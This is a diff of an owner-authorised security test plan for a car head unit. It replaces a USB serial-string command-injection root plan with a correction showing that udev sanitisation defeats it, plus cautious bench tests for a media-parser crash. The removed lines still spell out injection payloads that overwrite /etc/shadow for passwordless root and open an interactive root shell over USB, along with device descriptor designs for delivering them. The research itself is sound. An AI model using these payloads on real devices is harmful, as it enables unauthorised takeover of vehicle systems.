@@ -1,190 +1,168 @@
-# USB root-access test plan (owner-authorised, physical unit)
+# Bench root-path test plan — corrected after V-006 dynamic validation
 
-Scope: the owner's own head unit. Everything here is a lab procedure for their
-hardware. It is **not** published to the public repository; that mirror carries the
-status-only V-006 entry.
+Date: 2026-10-30
+Target family: Gen5W Linux/x86-64
+Safety: owner-authorized, disconnected bench unit only; preserve recovery access
 
-Build: EU Gen5W Linux `NE_E.EUR.S5W_L.001.001.260128`, kernel `4.1.27-abl`, x86-64.
+## Executive result
 
-## Vector A — serial-string command injection (V-006). Primary.
+The former primary vector—command injection through an MTP device's USB serial—is
+**not viable in recovered EU build `260128` through `ID_SERIAL_SHORT`**. This file
+supersedes the older `${IFS}` payload guidance.
 
-### Why it is the best candidate
+The authentic root automounter does construct shell commands unsafely, but udev's
+`usb_id` builtin reduces the property to:
 
-`/app/bin/usb-automount` runs as **uid 0** (its unit has no `User=`) and builds a shell
-command from the USB `iSerialNumber`:
-
-```
-0x5326  __sprintf_chk(cmd, …, "%s %s %s %s &", "/usr/bin/go-mtpfs", "--dev",
-                      ID_SERIAL_SHORT, "/media/mtp/<ID_SERIAL_SHORT>")
-0x535f  system(cmd)
-0x53b9  popen("cat /proc/mounts | grep %s", …)          // same string
+```text
+[A-Za-z0-9#+\-.:=@_]
 ```
 
-The branch is taken when `ID_USB_INTERFACES` contains `060101` (PTP) or `ffff00`
-(vendor-specific), tested at `0x44c3`–`0x44cf`.
+All tested command separators, substitutions, whitespace, quotes, redirects,
+globs, braces, parentheses and slashes become `_`. No tested surviving sequence
+can create a shell word, substitution, redirection or second command.
 
-### Filters, and why they do not stop it
+Do **not** attempt the old payload on a vehicle. It is disproved for this userspace,
+adds no useful evidence, and risks media-service disruption.
 
-| Filter | Effect |
-| --- | --- |
-| `usb_id` sanitiser (`util_replace_whitespace`, `0x22b72`) | only the `_ISspace` ctype bit is tested — **whitespace alone** becomes `_` |
-| serial charset (`0x1c2df`) | bytes `0x20`–`0x7f` accepted, **comma `0x2c` rejected** |
-| descriptor length | 126 UTF-16 code units ≈ 126 ASCII characters |
+## V-006 evidence
 
-So: no spaces, no commas — use `${IFS}`. `${`, `}`, `$`, `/`, `;`, `#`, `'`, `>` all
-survive.
+### Static sink
 
-### Validated payloads
+`/app/bin/usb-automount` runs without a `User=` override and contains:
 
-Checked against both filters (length and charset):
-
-```
-;id>/dev/kmsg;#                                   15 chars   proof of execution
-;echo${IFS}root::20481:0:99999:7:::>/etc/shadow;#  49 chars   credential overwrite
+```text
+0x535f  system("/usr/bin/go-mtpfs --dev %s /media/mtp/%s &")
+0x53b9  popen("cat /proc/mounts | grep %s", "r")
 ```
 
-The second is the useful one. `/etc/shadow` is a **symlink to `/tmp/shadow`**, and
-`esinit` populates that from `/etc/shadow.Global` at boot, so writing the file takes
-effect immediately. The field layout above matches the shipped
-`root:…:20481:0:99999:7:::` exactly, with an empty hash field — `login` is built
-without PAM, and an empty field means no password required.
+Both `%s` values derive from `ID_SERIAL_SHORT`. The branch requires PTP/MTP
+`ID_USB_INTERFACES=:060101:` or vendor-specific `ffff00`; mass storage follows
+direct `mount(2)` logic instead.
 
-`/etc/passwd` is likewise `/tmp/passwd`, populated from `passwd.legacy`, which already
-gives `root … /bin/sh`.
+### Corrected udev path
 
-### Two-stage result
+The original analysis stopped after `util_replace_whitespace()` and incorrectly
+assumed shell punctuation survived. `builtin_usb_id` actually calls:
 
-1. USB device delivers the payload → root command runs → `/etc/shadow` replaced.
-2. Log in on the **serial console** (`ttyS2`, 115200 8N1, root login already permitted
-   by `/etc/securetty`) with no password → interactive root.
+1. `0x22b20` at `0x1c334` — whitespace normalization;
+2. `0x22a00` at `0x1c33e`, `rsi = NULL` — character replacement using the
+   predicate at `0x29d80`.
 
-### Reversibility
+That predicate accepts letters, digits, and the built-in set at `0x537c9`:
 
-`/tmp` is tmpfs. The credential change disappears on reboot; nothing persistent is
-written by the USB path itself. That makes this safe to try and easy to undo.
-
-### Hardware
-
-**ESP32-S3 with native USB (TinyUSB)** is the right tool, because the trigger needs an
-**arbitrary interface class**, not a standard gadget:
-
-- required: one interface with class/subclass/protocol `06/01/01` (PTP) **or**
-  `ff/ff/00` (vendor-specific)
-- required: a custom `iSerialNumber` string containing the payload
-
-A Raspberry Pi Zero in USB-gadget mode **cannot do this** with configfs: its stock
-functions present `02/06/00` (ECM), `02/02/01` (ACM) or `08/06/50` (mass storage), none
-of which match either branch condition. Faking a vendor-specific class needs a custom
-kernel function. TinyUSB supplies descriptors verbatim, so the ESP32-S3 does it with a
-descriptor table and no kernel work.
-
-The device does **not** need to implement MTP. The branch only inspects the interface
-string, then builds and runs a shell command; `go-mtpfs` is absent from the image and
-the shell parses the line anyway.
-
-### Pre-flight in the VM (recommended first)
-
-Pass the ESP32 through to QEMU with `-device usb-host,vendorid=…,productid=…` and run
-the authentic image. That exercises the real `usb-automount`, real udev, real kernel and
-the real payload path before the car is involved. The only thing untested is the
-physical port and its power.
-
-## Design for a live, controllable ESP (revised)
-
-The owner can reprogram the ESP while it is plugged in, which changes this from a blind
-one-shot into an interactive channel. Two things make that possible.
-
-### 1. The payload can be an interactive shell, not just a command
-
-The command is backgrounded but the payload ends with `;#`, and the `#` comments out the
-trailing `&` — so the injected command becomes `system()`'s foreground child. That means a
-shell payload works:
-
-```
-;/bin/sh</dev/ttyACM0>/dev/ttyACM0${IFS}2>&1;#      46 chars, charset-clean
+```text
+#+-.:=@_
 ```
 
-Assembled, the firmware builds:
+There is also a narrow literal `\\x` exception. It cannot synthesize a byte in the
+shell: unquoted `\\x` is parsed as escaped `x`.
 
+### Dynamic result
+
+QEMU `usb-mtp` delivered this raw serial to sysfs:
+
+```text
+a;id>/tmp/v006.id;echo${IFS}V006KMSG>/dev/kmsg;#
 ```
-/usr/bin/go-mtpfs --dev ;/bin/sh</dev/ttyACM0>/dev/ttyACM0${IFS}2>&1;# /media/mtp/... &
+
+The udev property consumed by the authentic automounter was:
+
+```text
+a_id__tmp_v006.id_echo__IFS_V006KMSG__dev_kmsg_#
 ```
 
-which bash parses as `/bin/sh < /dev/ttyACM0 > /dev/ttyACM0 2>&1` — **an interactive root
-shell over USB**, with everything after it commented out.
+The root service reached the MTP `system()` call (proven by the missing
+`/usr/bin/go-mtpfs` shell error), stayed alive, and created no marker. A printable
+matrix confirmed:
 
-### 2. There is a usable feedback channel: CDC-ACM
+- replaced: `; | & $ ( ) { } < > * ? [ ] ! ~ ^ % ' " / \\` and whitespace;
+- retained: `# = @ : + - . _` plus alphanumerics.
 
-`CONFIG_USB_ACM=m` is in the kernel, and udev/`modprobe` will load it for the interface, giving
-`/dev/ttyACM0`. This is better than using a mass-storage mailbox, because the automounter's
-filesystem strings are only `ntfs`, `exfat` and `ext4` — a FAT volume from a microcontroller is
-not obviously in its whitelist, whereas the ACM device needs no mount at all.
+Primary logs:
 
-Fallbacks if `/dev/ttyACM0` does not appear: `/dev/ttyUSB0` (generic serial, also modular), or
-an exfat/ext4 mailbox.
+| Evidence | SHA-256 |
+|---|---|
+| `v006-exploit-host.log` | `568f3197ff178cbf8356674c74a149b66ec1bfd96eedd5f2098a830c84adb27a` |
+| `v006-sanitizer-matrix-host.log` | `de0757442ca4a74d3a3f87db79e8c3eb2b16b101dc47131d266af71ac734b0a1` |
+| `v006-discover-host.log` | `121f966b7c228425e5cfaec1f6e82a6ceef8a9bcebe28bf8f17f5e4cf6e2aef9` |
 
-### Composite descriptor
+### Residual test, not an exploitation plan
 
-| Interface | Class | Purpose |
-| --- | --- | --- |
-| vendor-specific | `ff/ff/00` | satisfies the MTP branch test at `0x44c3` |
-| CDC-ACM | `02/02/01` (+ data iface) | the data channel, `/dev/ttyACM0` |
-| `iSerialNumber` | — | the payload itself |
+A leading `#` can comment out the helper command, so descriptor-triggered command
+disruption remains plausible. Option-like values may also perturb `go-mtpfs` on a
+build where it exists. These are denial-of-service/robustness checks, not root
+access.
 
-Because descriptors are fixed at enumeration, **changing the payload means re-enumerating** —
-which TinyUSB can do in software. That is the whole iteration loop: push a new payload over
-WiFi, re-enumerate, and the unit runs it as root. No unplugging, and no access to the car beyond
-the USB port.
+On a disposable bench image only:
 
-### Practical order
+1. confirm the installed udev/automounter hashes before inferring parity;
+2. observe the `ID_SERIAL_SHORT` property rather than the raw sysfs serial;
+3. use inert values and monitor whether the helper is skipped or restarted;
+4. verify legitimate MTP/mass-storage operation afterward; and
+5. stop if the media stack restart-loops.
 
-1. `;id>/dev/ttyACM0;#` — confirms both the injection and the ACM channel in one step.
-2. `;ls${IFS}/dev/tty*>/dev/ttyACM0;#` — locate the right device node if `ttyACM0` is absent.
-   Note the earlier draft of this had a stray space after `>`, which the charset filter would
-   have turned into `_`; the corrected form above has none.
-3. `;/bin/sh</dev/ttyACM0>/dev/ttyACM0${IFS}2>&1;#` — interactive root.
-4. Optionally the credential overwrite, if a shell over USB is not wanted.
+No alternate USB-descriptor property was found flowing into the two shell sinks.
+A local privileged udev rule could overwrite the property, but that assumes the
+privilege V-006 was meant to obtain.
 
-### Caveats
+## Higher-value removable-media validation
 
-- `usb_serial`/`usb_acm` are modules; if the unit does not autoload them the node will not
-  appear, which is why step 2 exists.
-- The MTP branch fires on the USB **device** add event; the automount service must already be
-  running. Inserting during early boot may miss it.
-- The shell inherits the automounter's environment and blocks it while open. That is acceptable
-  for a takeover but means the automounter stops responding afterwards.
+The current evidence-based path is parser reachability, not descriptor shell
+injection.
 
-## Vector B — media parsing as root (V-007). No known bug.
+### ASF stream-count crash (V-012)
 
-Media scanning, indexing, playback and metadata extraction all run as uid 0 with no
-sandbox, so any parser memory-safety defect would be root. No such defect has been
-identified, so this is a fuzzing target rather than a usable entry today. Worth keeping
-in the list, not worth trying first.
+The shipped GStreamer ASF plugin is dynamically vulnerable to CVE-2026-2920 in
+the isolated VM. A valid WMA/ASF file with 33 Stream Properties Objects reaches a
+fixed 32-entry array and crashes authentic `gst-discoverer-1.0` after creating
+stream 33.
 
-## Vector C — USB Ethernet. Supported, but not useful alone.
+This establishes memory corruption and denial of service only. It does not
+establish code execution or automatic physical-unit reachability.
 
-The kernel has `CONFIG_USB_NET_CDCETHER=m`, so a CDC-ECM gadget gives the unit a network
-interface. But the image ships **no DHCP client** (`udhcpc`, `dhclient`, `dhcpcd`,
-`connman`, `systemd-networkd`, `NetworkManager` all absent) and **no remote-login
-daemon** (`dropbear` not installed, no `sshd`, no `telnetd`). A network interface with
-nothing listening and no address is not a foothold. Skip unless combined with something
-else.
+Before any bench test:
 
-## What is still unproven
+1. validate a known-good recovery/update path and preserve the installed build;
+2. disconnect the head unit from the vehicle and all networks;
+3. use a disposable USB device containing one benign control and one bounded
+   crash-only probe generated by `tools/uk_fw/asf_stream_probe.py`;
+4. capture service uid, process tree, DLT/journal and restart behavior;
+5. test explicit playback separately from automatic indexing/thumbnailing;
+6. remove the media immediately if a restart loop or UI wedge occurs; and
+7. make no code-execution claim unless instruction-pointer control is separately
+   and safely demonstrated.
 
-- The injection is **statically confirmed only**. It has not been executed on the unit,
-  nor yet in the VM with a real device.
-- Whether the head unit's USB port supplies enough current for the chosen board.
-- Whether the MTP branch fires on device insertion in every boot state, or only once the
-  automount service is up.
-- Empty-password root login is expected to be accepted by the non-PAM `login`, but that
-  is reasoning from the binary, not an observed login.
+See `evidence/gstreamer-cve-2026-2920.md`.
 
-## Suggested order of work
+## Other bench paths
 
-1. Flash an ESP32-S3 with the vendor-specific interface and the `;id>/dev/kmsg;#`
-   proof-of-execution serial. Observe via UART if available.
-2. If proof appears, switch the serial to the shadow-overwrite payload and log in on
-   `ttyS2`.
-3. Only if (1) fails, investigate boot-state timing, port power, or the interface
-   descriptor shape.
+These remain evidence-gathering paths, not established root exploits:
+
+- V-011 missing `MS_NODEV`: first prove that this exact Tuxera `tntfs` module
+  materializes a harmless NTFS special-file encoding. FAT/exFAT cannot natively
+  provide the required inode, and an exposed node still requires local code to
+  open it. Do not target internal storage in the test;
+- password-gated serial console: identify the actual boot caller, active account
+  database and physical UART before testing authentication;
+- removable-media updater: validate signatures, manifest checks, downgrade rules
+  and recovery behavior with inert malformed packages, never a production key or
+  unreviewed image;
+- media parser hardening: confirm services run under dedicated non-root identities
+  after remediation and that malformed files fail without restart loops;
+- SMACK boundaries: record labels and policy decisions before treating uid 0 as
+  unrestricted.
+
+## Stop conditions
+
+Stop immediately on repeated reboot, storage errors, unexpected writes outside
+the disposable media, loss of serial recovery, thermal warnings, or any evidence
+the disconnected bench setup can interact with vehicle networks.
+
+## Claims that are not permitted from current evidence
+
+- V-006 provides USB-to-root on `260128`.
+- `${IFS}` or shell separators survive `ID_SERIAL_SHORT`.
+- The V-012 ASF crash is arbitrary code execution.
+- VM behavior proves the owner's installed build or physical hardware behavior.
+- Root in one SMACK domain implies unrestricted CAN, ECU-key or safety-system
+  access.
